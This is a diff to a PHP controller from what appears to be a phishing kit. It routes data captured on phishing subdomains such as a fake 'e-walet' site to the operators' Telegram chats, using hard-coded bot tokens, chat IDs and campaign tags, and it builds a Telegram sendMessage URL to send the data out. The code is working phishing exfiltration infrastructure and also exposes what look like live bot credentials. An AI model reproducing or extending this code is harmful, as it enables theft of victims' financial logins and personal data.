@@ -56,12 +56,15 @@ class Phising1Controller extends Controller
     {
 
 
-        if ($subdomain == "live-vc-private1-my6") {
+        if ($subdomain == "e-walet") {
             // BOT 6
-            $bot_token = "7724085428:AAH8nxi8ZObEylt751zwZbWdEc8_7HwZESc";
-            $chat_id = "7935306179";
-            $phisData = "MY6";
+            $bot_token = "7329557554:AAEyGwqnUFP_tpc_xKtnGLsxT8fQi9I5AIA";
+            $chat_id = "7765826083";
+            $phisData = "GIF2";
         } else {
+            $bot_token = "8066350060:AAFHJGLPkxtiROejFAhKeRVmUu7GJkXGtlM";
+            $chat_id = "7201344011";
+            $phisData = "GIF1";
         }
 
         $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
